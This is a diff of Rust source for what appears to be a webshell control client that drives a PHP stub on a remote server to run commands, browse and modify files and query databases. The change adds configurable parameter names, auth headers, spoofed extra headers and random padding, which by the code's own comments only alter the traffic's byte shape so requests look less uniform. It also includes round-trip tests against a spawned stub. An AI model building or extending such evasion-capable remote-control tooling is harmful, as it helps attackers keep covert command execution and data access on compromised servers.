@@ -160,6 +160,154 @@ impl ProtocolPlugin for PhpProtocol {
     }
 }
 
+/// 每 Shell 的传输形态（W2）。字段全部可选，缺省即历史行为。
+///
+/// 存在 `protocol_params.transport` 里（无需 DB 迁移）：
+/// ```json
+/// { "param": "sess", "header": "X-Token",
+///   "extraHeaders": {"X-Requested-With": "XMLHttpRequest"},
+///   "pathSuffix": "?v=1", "padding": 16 }
+/// ```
+/// `param` / `header` 必须与 stub 生成时的配置一致（NATIVE 通道把它们烘焙进 stub）；
+/// 其余字段只影响客户端请求形态。
+#[derive(Debug, Clone, Default)]
+pub struct TransportProfile {
+    /// NATIVE 通道的请求参数名（默认 `formData`）。
+    pub param: Option<String>,
+    /// NATIVE 通道的鉴权头名（默认 `X-Debug-Key`）。
+    pub header: Option<String>,
+    /// 附加请求头（所有通道）。
+    pub extra_headers: Vec<(String, String)>,
+    /// 附加到 endpoint 的查询串（如 `?v=1`）。
+    pub path_suffix: String,
+    /// 表单体随机填充字节数（NATIVE / legacy 表单通道；上限 4096）。
+    pub padding: usize,
+}
+
+impl TransportProfile {
+    /// 从 `protocol_params` 解析；缺省/空值 → 历史行为。非法配置直接报错。
+    pub fn from_protocol_params(raw: &str) -> Result<Self, ProtocolError> {
+        let Ok(value) = serde_json::from_str::<Value>(raw) else {
+            return Ok(Self::default());
+        };
+        let Some(transport) = value.get("transport") else {
+            return Ok(Self::default());
+        };
+        let Some(obj) = transport.as_object() else {
+            return Err(ProtocolError::NotSupported(
+                "protocol_params.transport 必须是 JSON 对象".into(),
+            ));
+        };
+        let text = |key: &str| {
+            obj.get(key)
+                .and_then(|item| item.as_str())
+                .map(str::to_string)
+                .filter(|item| !item.is_empty())
+        };
+        let mut extra_headers = Vec::new();
+        if let Some(map) = obj.get("extraHeaders") {
+            let Some(map) = map.as_object() else {
+                return Err(ProtocolError::NotSupported(
+                    "transport.extraHeaders 必须是对象".into(),
+                ));
+            };
+            for (name, value) in map {
+                let Some(value) = value.as_str() else {
+                    return Err(ProtocolError::NotSupported(format!(
+                        "transport.extraHeaders.{name} 必须是字符串"
+                    )));
+                };
+                extra_headers.push((name.clone(), value.to_string()));
+            }
+        }
+        let padding = obj
+            .get("padding")
+            .and_then(|item| item.as_u64())
+            .unwrap_or(0) as usize;
+        let profile = Self {
+            param: text("param"),
+            header: text("header"),
+            extra_headers,
+            path_suffix: text("pathSuffix").unwrap_or_default(),
+            padding,
+        };
+        profile.validate()?;
+        Ok(profile)
+    }
+
+    /// 校验：参数名 / 头名 / 额外头 / 查询串 / 填充长度。
+    ///
+    /// 头名与头值严格拒绝 CRLF —— 配置来自持久化的 Shell 档案，
+    /// 不能成为请求头注入的入口。
+    pub fn validate(&self) -> Result<(), ProtocolError> {
+        if let Some(param) = self.param.as_deref() {
+            dosword_sdk::encoder::validate_php_ident("请求参数名", param)?;
+        }
+        if let Some(header) = self.header.as_deref() {
+            dosword_sdk::encoder::validate_http_header(header)?;
+        }
+        for (name, value) in &self.extra_headers {
+            dosword_sdk::encoder::validate_http_header(name)?;
+            if value.contains('\r') || value.contains('\n') {
+                return Err(ProtocolError::NotSupported(format!(
+                    "额外请求头 {name} 的值不得包含换行"
+                )));
+            }
+            if value.len() > 1024 {
+                return Err(ProtocolError::NotSupported(format!(
+                    "额外请求头 {name} 的值过长（上限 1024）"
+                )));
+            }
+        }
+        if !self.path_suffix.is_empty() {
+            let valid = self.path_suffix.len() <= 256
+                && (self.path_suffix.starts_with('?') || self.path_suffix.starts_with('&'))
+                && !self
+                    .path_suffix
+                    .chars()
+                    .any(|ch| ch.is_whitespace() || ch == '#');
+            if !valid {
+                return Err(ProtocolError::NotSupported(format!(
+                    "transport.pathSuffix 不合法：{}（需以 ? 或 & 开头，不含空白与 #，长度 ≤ 256）",
+                    self.path_suffix
+                )));
+            }
+        }
+        if self.padding > 4096 {
+            return Err(ProtocolError::NotSupported(
+                "transport.padding 过大（上限 4096 字节）".into(),
+            ));
+        }
+        Ok(())
+    }
+
+    /// 实际请求 URL（endpoint + 查询串）。
+    pub fn url(&self, endpoint: &str) -> String {
+        format!("{endpoint}{}", self.path_suffix)
+    }
+}
+
+/// 给表单体追加随机填充字段（W2：传输形态）。
+///
+/// 不改动载荷语义（stub 忽略未知字段），只改变请求的字节形态。
+fn append_padding(body: &mut String, bytes: usize) {
+    if bytes == 0 {
+        return;
+    }
+    let mut buf = vec![0u8; bytes.min(4096)];
+    if getrandom::fill(&mut buf).is_err() {
+        for (index, byte) in buf.iter_mut().enumerate() {
+            *byte = (index as u8).wrapping_mul(31).wrapping_add(7);
+        }
+    }
+    let value: String = buf.iter().map(|byte| format!("{byte:02x}")).collect();
+    let name: String = format!("p{}", &value[..value.len().min(16)]);
+    body.push('&');
+    body.push_str(&name);
+    body.push('=');
+    body.push_str(&value);
+}
+
 /// PHP 协议的会话状态：持有专用 HTTP 客户端（每会话独立，避免跨会话并发干扰）。
 pub struct PhpSession {
     pub endpoint: String,
@@ -185,6 +333,8 @@ pub struct PhpSession {
     /// 门禁语义见 `require_capability`：**只有明确上报且缺项时才拒绝**，
     /// 避免把「旧 stub 没这个字段」误判成「不支持」。
     pub capabilities: Option<TargetCapabilities>,
+    /// 传输形态（W2）：参数名 / 头名 / 额外头 / 查询串 / 填充。
+    pub transport: TransportProfile,
 }
 
 /// 能力门禁：仅当 stub **明确上报**了能力清单且其中不含目标能力时拒绝。
@@ -295,6 +445,7 @@ impl PhpProtocol {
                 ),
                 // 探测用的临时会话：能力由 probe 响应决定，随后写回真实会话
                 capabilities: None,
+                transport: TransportProfile::from_protocol_params(&profile.protocol_params)?,
             };
             return self.session_probe(&php, settings);
         }
@@ -317,6 +468,7 @@ impl PhpProtocol {
                     &effective_password(&profile.protocol_params, &profile.password),
                 ),
                 capabilities: None,
+                transport: TransportProfile::from_protocol_params(&profile.protocol_params)?,
             };
             return self.session_probe(&php, settings);
         }
@@ -340,15 +492,23 @@ impl PhpProtocol {
             Some(client) => client.clone(),
             None => build_client(settings),
         };
-        let value = self.send_frame(
-            &client,
-            &profile.endpoint,
-            &profile.password,
-            &code,
-            settings,
-            "probe",
+        // 旧 stub 兼容：临时会话（transport 由 protocol_params 决定）
+        let php = PhpSession {
+            endpoint: profile.endpoint.clone(),
+            // 加盐 stub 必须用派生后的有效密码（此前 legacy 探针漏了这一步，
+            // 导致「加盐 + legacy 编码器」在探测阶段就鉴权失败）
+            password: effective_password(&profile.protocol_params, &profile.password),
+            client,
             encoder,
-        )?;
+            initialized: std::sync::Mutex::new(false),
+            session_mode: false,
+            chunked: false,
+            cwd: std::sync::Mutex::new(String::new()),
+            aead: None,
+            capabilities: None,
+            transport: TransportProfile::from_protocol_params(&profile.protocol_params)?,
+        };
+        let value = self.send_frame(&php, &code, settings, "probe")?;
 
         let server = value
             .pointer("/data/server")
@@ -745,23 +905,22 @@ impl PhpProtocol {
     #[allow(clippy::too_many_arguments)] // 帧协议字段固定，拆结构体反而增加调用方噪声
     fn send_frame(
         &self,
-        client: &reqwest::blocking::Client,
-        endpoint: &str,
-        password: &str,
+        php: &PhpSession,
         code_template: &str,
         settings: &AppSettings,
         action: &str,
-        encoder: &dyn PayloadEncoder,
     ) -> Result<Value, ProtocolError> {
         // 8 字节随机 nonce（hex 字符串）
         let nonce = random_nonce();
         let start = Instant::now();
         let code = code_template.replace("{NONCE}", &nonce);
 
+        let encoder = php.encoder;
+        let password = php.password.as_str();
         // 按编码器编码载荷（与服务端 stub 的解码逻辑对应）
         // body 模式（如 php_stream）：载荷直传请求体，stub 用 include 流执行；
         // 表单模式：POST k（密码）+ x（编码后载荷）。
-        let body = if encoder.body_mode() {
+        let mut body = if encoder.body_mode() {
             encoder.encode(&code, password)
         } else {
             let (key_param, data_param) = encoder.form_params();
@@ -772,10 +931,21 @@ impl PhpProtocol {
                 form_escape(&payload)
             )
         };
+        // W2：表单体随机填充（stub 忽略未知字段）；请求体直传模式不填充
+        if !encoder.body_mode() {
+            append_padding(&mut body, php.transport.padding);
+        }
 
-        let response = client
-            .post(endpoint)
-            .header("Content-Type", "application/x-www-form-urlencoded")
+        // W2：查询串 + 额外请求头
+        let url = php.transport.url(&php.endpoint);
+        let mut request = php
+            .client
+            .post(&url)
+            .header("Content-Type", "application/x-www-form-urlencoded");
+        for (name, value) in &php.transport.extra_headers {
+            request = request.header(name, value);
+        }
+        let response = request
             .body(body)
             .send()
             .map_err(|error| ProtocolError::Network(error.to_string()))?;
@@ -805,12 +975,12 @@ impl PhpProtocol {
         crate::protocol::reqlog::record_request(
             PHP_PROTOCOL_ID,
             action,
-            endpoint,
+            &php.endpoint,
             status.as_u16(),
             duration_ms,
             &code,
             &text,
-            password,
+            &php.password,
         );
 
         // 鉴权失败时服务器直接输出明文 AUTH_FAIL（无帧）
@@ -1036,6 +1206,7 @@ impl Protocol for PhpProtocol {
                 &effective_password(&profile.protocol_params, &profile.password),
             ),
             capabilities: result.capabilities.clone(),
+            transport: TransportProfile::from_protocol_params(&profile.protocol_params)?,
         });
         Ok((session, result))
     }
@@ -1065,15 +1236,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME
         );
         let start = Instant::now();
-        let value = self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "exec",
-            php.encoder,
-        )?;
+        let value = self.send_frame(php, &code, settings, "exec")?;
         let duration_ms = start.elapsed().as_millis() as u64;
 
         let raw = value
@@ -1120,15 +1283,7 @@ impl Protocol for PhpProtocol {
             dosword_sdk::php_impl::PHP_SCAN_IMPL,
             TEMPLATE_FRAME
         );
-        let value = self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "list_dir",
-            php.encoder,
-        )?;
+        let value = self.send_frame(php, &code, settings, "list_dir")?;
 
         let entries: Vec<FileEntry> = value
             .pointer("/data/entries")
@@ -1190,15 +1345,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        let value = self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "read_file",
-            php.encoder,
-        )?;
+        let value = self.send_frame(php, &code, settings, "read_file")?;
 
         value
             .get("data")
@@ -1229,15 +1376,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "write_file",
-            php.encoder,
-        )?;
+        self.send_frame(php, &code, settings, "write_file")?;
         Ok(())
     }
 
@@ -1261,15 +1400,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "delete",
-            php.encoder,
-        )?;
+        self.send_frame(php, &code, settings, "delete")?;
         Ok(())
     }
 
@@ -1295,15 +1426,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "rename",
-            php.encoder,
-        )?;
+        self.send_frame(php, &code, settings, "rename")?;
         Ok(())
     }
 
@@ -1327,15 +1450,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "mkdir",
-            php.encoder,
-        )?;
+        self.send_frame(php, &code, settings, "mkdir")?;
         Ok(())
     }
 
@@ -1361,15 +1476,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "touch",
-            php.encoder,
-        )?;
+        self.send_frame(php, &code, settings, "touch")?;
         Ok(())
     }
 
@@ -1418,15 +1525,7 @@ impl Protocol for PhpProtocol {
             off = offset,
             len = length,
         );
-        let value = self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "read_chunk",
-            php.encoder,
-        )?;
+        let value = self.send_frame(php, &code, settings, "read_chunk")?;
         value
             .get("data")
             .and_then(|v| v.as_str())
@@ -1475,15 +1574,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME,
             off = offset,
         );
-        self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "write_chunk",
-            php.encoder,
-        )?;
+        self.send_frame(php, &code, settings, "write_chunk")?;
         Ok(())
     }
 
@@ -1515,15 +1606,7 @@ impl Protocol for PhpProtocol {
             dosword_sdk::php_impl::PHP_DB_PROBE_IMPL,
             TEMPLATE_FRAME
         );
-        let value = self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "db_probe",
-            php.encoder,
-        )?;
+        let value = self.send_frame(php, &code, settings, "db_probe")?;
         let databases = value
             .pointer("/data/databases")
             .and_then(|v| v.as_array())
@@ -1567,15 +1650,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME
         );
         let start = Instant::now();
-        let value = self.send_frame(
-            &php.client,
-            &php.endpoint,
-            &php.password,
-            &code,
-            settings,
-            "db_query",
-            php.encoder,
-        )?;
+        let value = self.send_frame(php, &code, settings, "db_query")?;
         let duration_ms = start.elapsed().as_millis() as u64;
 
         let columns = value
@@ -1659,13 +1734,14 @@ fn session_post(
     settings: &AppSettings,
 ) -> Result<Vec<u8>, ProtocolError> {
     let started = std::time::Instant::now();
-    let response = match php
+    let mut request = php
         .client
-        .post(&php.endpoint)
-        .header("Content-Type", "application/x-www-form-urlencoded")
-        .body(body)
-        .send()
-    {
+        .post(php.transport.url(&php.endpoint))
+        .header("Content-Type", "application/x-www-form-urlencoded");
+    for (name, value) in &php.transport.extra_headers {
+        request = request.header(name, value);
+    }
+    let response = match request.body(body).send() {
         Ok(response) => response,
         Err(error) => {
             // 失败请求同样留痕（请求调试页此前对 NATIVE/session 通道完全空白）
@@ -1858,17 +1934,22 @@ fn native_call(
         crate::protocol::transport::gzip_payload(&payload, settings.gzip_enabled && gzip_legacy_ok);
     // base64 载荷可能含 +/=，必须转义（否则 PHP 表单解析时 + 转空格损坏密文）；
     // P2：手动快速转义（仅 +、=、&），避免对整块载荷全量百分号编码
-    let body = format!("formData={}", form_escape(&payload));
+    // W2：参数名/头名可配（必须与 stub 生成时一致），另支持查询串、额外头与随机填充
+    let param = php.transport.param.as_deref().unwrap_or("formData");
+    let header_name = php.transport.header.as_deref().unwrap_or("X-Debug-Key");
+    let mut body = format!("{param}={}", form_escape(&payload));
+    append_padding(&mut body, php.transport.padding);
     let token = auth_token(php);
     let started = std::time::Instant::now();
-    let response = match php
+    let mut builder = php
         .client
-        .post(&php.endpoint)
+        .post(php.transport.url(&php.endpoint))
         .header("Content-Type", "application/x-www-form-urlencoded")
-        .header("X-Debug-Key", &token)
-        .body(body)
-        .send()
-    {
+        .header(header_name, &token);
+    for (name, value) in &php.transport.extra_headers {
+        builder = builder.header(name, value);
+    }
+    let response = match builder.body(body).send() {
         Ok(response) => response,
         Err(error) => {
             log_request(php, action, 0, started, &request, "");
@@ -2472,6 +2553,93 @@ for($i=0;$i<strlen($raw);$i++){$code.=$raw[$i]^$key[$i%strlen($key)];}
                 );
             }
         }
+    }
+
+    /// W2：传输形态配置的校验（非法值必须拒绝，尤其是请求头注入）。
+    #[test]
+    fn transport_profile_validation() {
+        for params in [
+            r#"{"transport":{"param":"bad-name"}}"#,
+            r#"{"transport":{"param":"1abc"}}"#,
+            r#"{"transport":{"header":"X\r\nInjected: 1"}}"#,
+            r#"{"transport":{"extraHeaders":{"X-Ok":"a\r\nb"}}}"#,
+            r#"{"transport":{"pathSuffix":"v=1"}}"#,
+            r#"{"transport":{"pathSuffix":"?a b"}}"#,
+            r#"{"transport":{"pathSuffix":"?a#b"}}"#,
+            r#"{"transport":{"padding":99999}}"#,
+            r#"{"transport":[]}"#,
+            r#"{"transport":{"extraHeaders":[]}}"#,
+        ] {
+            assert!(
+                TransportProfile::from_protocol_params(params).is_err(),
+                "应拒绝非法传输形态：{params}"
+            );
+        }
+        let ok = TransportProfile::from_protocol_params(
+            r#"{"transport":{"param":"sess","header":"X-Token","pathSuffix":"?v=1","padding":8,"extraHeaders":{"X-A":"1"}}}"#,
+        )
+        .expect("合法配置");
+        assert_eq!(ok.param.as_deref(), Some("sess"));
+        assert_eq!(ok.header.as_deref(), Some("X-Token"));
+        assert_eq!(ok.extra_headers, vec![("X-A".to_string(), "1".to_string())]);
+        assert_eq!(ok.url("http://x/shell.php"), "http://x/shell.php?v=1");
+        // 缺省 = 历史行为
+        let default = TransportProfile::from_protocol_params("{}").expect("默认");
+        assert!(default.param.is_none() && default.header.is_none());
+        assert_eq!(default.url("http://x"), "http://x");
+    }
+
+    /// W2：自定义参数名 + 鉴权头名必须与 stub 一致才能连通。
+    ///
+    /// 用 `stub_with` 生成 `sess` / `X-Token` 的 stub：匹配的配置应成功；
+    /// 用默认参数名/头名连接必须失败 —— 证明这两个值真的被 stub 使用，
+    /// 而不是客户端单方面"配置成功"。
+    #[test]
+    fn real_php_transport_profile_round_trip() {
+        use dosword_sdk::encoder::StubOptions;
+        let settings = settings();
+        let opts = StubOptions {
+            param: "sess".into(),
+            header: "X-Token".into(),
+        };
+        let encoder = dosword_sdk::EncoderRegistry::global()
+            .get("native")
+            .expect("native 编码器");
+        let stub = encoder
+            .stub_with("php", "secret", &opts)
+            .expect("生成自定义传输形态 stub");
+        let Some((url, dir, mut child)) = spawn_php_server_stub(&stub, "native", false) else {
+            eprintln!("跳过：未检测到 php 可执行文件");
+            return;
+        };
+        let result = (|| -> Result<(), ProtocolError> {
+            // 1) 匹配的传输形态（含查询串 / 额外头 / 填充）：应成功
+            let mut profile = profile(&url);
+            profile.protocol_params = r#"{"encoder":"native","transport":{"param":"sess","header":"X-Token","pathSuffix":"?v=1","padding":32,"extraHeaders":{"X-Requested-With":"XMLHttpRequest"}}}"#.to_string();
+            let (session, probe) = PhpProtocol.connect(&profile, &settings)?;
+            assert_eq!(probe.status, "online");
+            let output =
+                PhpProtocol.execute_command(session.as_ref(), "printf transport-ok", &settings)?;
+            assert_eq!(output.stdout.trim(), "transport-ok");
+            let listing =
+                PhpProtocol.list_dir(session.as_ref(), &dir.display().to_string(), &settings)?;
+            assert!(!listing.entries.is_empty(), "目录列举应返回内容");
+            drop(session);
+
+            // 2) 不匹配（默认参数名/头名）：必须失败
+            let mut wrong = profile.clone();
+            wrong.protocol_params = r#"{"encoder":"native"}"#.to_string();
+            let error = match PhpProtocol.connect(&wrong, &settings) {
+                Ok(_) => panic!("参数名/头名不匹配时必须连不上"),
+                Err(error) => error,
+            };
+            assert!(!error.to_string().is_empty());
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("传输形态往返失败：{error}"));
     }
 
     /// gzip：NATIVE 通道的**明文层**信封构造与还原。
